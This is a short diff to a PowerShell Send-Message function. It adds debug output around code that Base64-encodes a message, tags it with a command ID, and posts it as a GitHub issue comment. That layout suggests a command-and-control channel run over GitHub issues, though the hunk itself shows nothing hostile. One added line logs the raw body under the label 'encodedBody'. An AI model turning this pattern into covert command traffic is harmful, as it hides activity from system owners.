@@ -33,8 +33,12 @@ function Send-Message
 
             default
             {
+                Write-Console -Message ("Default switch entered.")
+                Write-Console -Message ("body is currently set to " + $body)
                 $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
+                Write-Console -Message ("encodedBody is currently set to " + $body)
                 $mergedBody = "[" + $commandID + "]:" + $encodedBody
+                Write-Console -Message ("Merged body is " + $mergedBody)
 			    New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
                 break
             }
